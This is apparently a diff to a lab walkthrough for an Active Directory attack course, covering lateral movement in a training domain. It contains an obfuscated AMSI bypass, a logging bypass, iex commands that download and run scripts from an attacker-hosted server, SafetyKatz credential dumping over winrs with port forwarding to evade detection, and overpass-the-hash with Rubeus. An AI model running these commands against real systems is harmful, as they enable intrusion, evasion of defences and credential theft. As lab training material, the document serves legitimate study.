@@ -653,46 +653,165 @@ C:\AD\Tools\BloodHound-4.0.3_old\BloodHound-master\Collectors
 # **Lateral Movement**
 
 
+### **Step 1 - Identify a machine in the target domain where a Domain Admin session is available.**
 
 
+Remember we got access to `dcorp\ciadmin` via the Jenkins instance, we can use this domain user to enumerate more domain admin session is available, Go ahead and get reverse shell with Jenkins again ☹️
 
 
+![](https://i.imgur.com/z0Fu3jR.png)
 
 
+- First, we must bypass AMSI and enhanced logging.
+- The below command bypasses Enhanced Script Block Logging
+- Make sure to setup **HFS** and host the `sbloggingbypass.txt` for this
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-```
-![](https://i.imgur.com/LiMEZ8q.png)
-
-In the lab we are using `betterSafetyKatz.exe` to forge tickets only and `safetyKatz.exe` to extract information
-
-# **Learning Objective 1**
+```powershell
+iex (iwr http://172.16.100.x/sbloggingbypass.txt -UseBasicParsing)
 ```
 
 
+![](https://i.imgur.com/6KibfHl.png)
+
+
+- Bypass AMSI
+
+```powershell
+S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+```
+
+
+
+- Download and execute PowerView in memory of the reverse shell
+- Make sure to setup **HFS** for this also, hosting the `PowerView.ps1` script
+
+
+```powershell
+iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
+```
+
+
+- Then run this command to find **domain admin session** 
+- Note that this might take a lot of time, so wait!! 🤣
+
+
+```powershell
+Find-DomainUserLocation
+```
+
+
+![](https://i.imgur.com/mgNGQFW.png)
+
+
+- Great! There is a domain admin session on dcorp-mgmt server
+
+> **Note** -: If you don't get result within 4 minutes hit the **Enter** key on your keyboard twice you should see output, hence, keep waiting till something comes up
+
+
+
+### **Step 2 - Abuse using winrs**
+
+
+**Let’s check if we can execute commands on dcorp-mgmt server and if the winrm port is open:**
+
+
+```powershell
+winrs -r:dcorp-mgmt hostname;whoami
+```
+
+
+![](https://i.imgur.com/wBUPKu0.png)
+
+
+
+**Once this is confirmed we can go ahead and run SafetyKatz.exe on dcorp-mgmt to extract credentials from it** -:
+
+
+
+- download `Loader.exe` on **dcorp-ci** and copy it from there to **dcorp-mgmt**
+
+
+
+```powershell
+iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
+
+
+
+- Copy the `Loader.exe` to **dcorp-mgmt**:
+
+
+
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+
+
+**_Right Output -:_**
+
+
+![](https://i.imgur.com/oHkafUX.png)
+
+
+- Using `winrs`, add the following port forwarding on **dcorp-mgmt** to avoid detection on **dcorp-mgmt**
+
+
+```powershell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+
+
+# $null - output redirection issues
+```
+
+
+- Use `Loader.exe` to download and execute `SafetyKatz.exe` in-memory on **dcorp-mgmt**
+- Make sure to host `SafetyKatz.exe` on **HFS**
+
+
+```powershell
+$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+```
+
+
+**_Right Output -:_**
+
+
+![](https://i.imgur.com/d620Z2B.png)
+
+
+
+> We got credentials of svcadmin - a domain administrator. Note that **svcadmin** is used as a service account, so you can even get credentials in clear-text from lsasecrets!
+
+
+![](https://i.imgur.com/d7iaV5E.png)
+
+
+**Incase you want to use Powershell Remoting instead of winrs, you can check out lab manual**
+
+### **Step 3 - OverPass-the-Hash Rubeus**
+
+
+We will use **OverPass-the-Hash**, to use svcadmin's credentials
+
+
+- Spawn an elevated shell from the student VM (**Run as Administrator**)
+
+```powershell
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+- You should now see a new window/process come up
+- Try accessing the domain controller from the new process!
+
+
+```powershell
+# To run command remotely
+winrs -r:dcorp-dc whoami
+
+# To get active shell
+winrs -r:dcorp-dc cmd
+```
+
+
+
+![](https://i.imgur.com/gwUwl7h.png)
